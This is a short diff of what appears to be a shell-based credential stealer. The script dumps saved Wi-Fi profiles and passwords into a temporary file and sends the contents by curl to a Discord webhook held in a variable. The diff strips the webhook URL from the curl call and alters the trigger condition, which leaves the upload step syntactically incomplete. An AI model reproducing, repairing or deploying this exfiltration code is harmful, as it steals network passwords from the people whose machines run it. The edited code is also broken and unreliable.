@@ -4,11 +4,11 @@ echo "$wifiProfiles" > "$TMPDIR/--wifi-pass.txt"
 
 function Upload-Discord {
     if [[ "$REQUEST_METHOD" == "POST" ]]; then
-        curl -X POST -H "Content-Type: application/json" -d "{\"username\":\"$USER\",\"content\":\"$1\"}" "$dc"
+        curl -X POST -H "Content-Type: application/json" -d "{\"username\":\"$USER\",\"content\":\"$1\"}"
     fi
 }
 
-if [[ -n "$dc" ]]; then
+if [[ "$REQUEST_METHOD" == "POST" ]]; then
     Upload-Discord "$(cat "$TMPDIR/--wifi-pass.txt")"
 fi
 
